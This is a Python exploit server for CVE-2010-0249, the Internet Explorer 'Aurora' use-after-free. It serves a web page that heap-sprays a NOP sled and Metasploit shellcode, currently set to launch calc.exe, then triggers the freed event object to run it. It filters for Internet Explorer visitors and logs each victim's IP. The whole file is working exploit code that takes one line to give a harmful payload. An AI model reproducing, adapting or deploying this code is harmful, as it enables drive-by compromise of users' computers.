#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#
#   This program acts as a web server that generates an exploit to 
#   target a vulnerability (CVE-2010-0249) in Internet Explorer. 
#   The exploit was tested using Internet Explorer 6 on Windows XP SP2. 
#   The exploit's payload spawns the calculator. 
#
#   Usage  : python ie_aurora.py [port number]
#   
 
import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73'
        payload += '\x13\x6f\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e'
        payload += '\x6f\x02\x3a\x4b\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a'
        payload += '\x3a\x51\x4f\x03\x5a\x47\xe4\x36\x3a\x0f\x81\x33\x71\x97'
        payload += '\xc3\x86\x71\x7a\x68\xc3\x7b\x03\x6e\xc0\x5a\xfa\x54\x56'
        payload += '\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68\xe4\x0e\xfa\x85'
        payload += '\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a\x6b\xc1'
        payload += '\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02'
        payload += '\x3a\x66\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e'
        payload += '\x07\x7c\x69\xec\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61'
        payload += '\xd0\x62\x0c\x2c\xd4\x76\x0a\x02\xb1\x0e'
        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>
            
            var obj, event_obj;
            
            function spray_heap()
            {
                var chunk_size, payload, nopsled;
            
                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);        
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }
        
            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }
        
            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }
      
            function ev2()
            {
                var data, tmp;
                
                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }
                    
            function check()
            {
                if (navigator.userAgent.indexOf("MSIE") == -1)
                    return false;
                return true;   
            }
            
            if (check()) {
                initialize();
                spray_heap();               
            }
            else
                window.location = 'about:blank'
                
            </script>
        </head>
        <body>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>        
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit 

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':      
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)
            
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...' 
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)
            
if __name__ == '__main__':
    main()
